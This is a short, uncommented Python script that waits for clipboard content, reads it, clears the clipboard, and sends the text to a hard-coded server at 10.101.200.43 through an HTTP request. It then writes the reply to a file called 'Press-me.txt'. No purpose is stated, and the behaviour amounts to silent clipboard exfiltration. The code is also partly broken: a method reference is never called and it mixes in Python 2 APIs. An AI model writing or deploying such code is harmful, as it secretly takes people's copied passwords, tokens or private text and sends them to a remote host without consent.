import urllib,sys
from tkinter import Tk
from time import sleep

r=Tk()
r.withdraw()


while not r.selection_get(selection="CLIPBOARD"):
    sleep(0.1)


result = r.selection_get(selection="CLIPBOARD")
r.clipboard_clear()
r.destroy
#print(result)

html = urllib.urlopen('http://10.101.200.43/coco.php?args=' + result)

sys.stdout=open("Press-me.txt","w")
print(html)
sys.stdout.close()
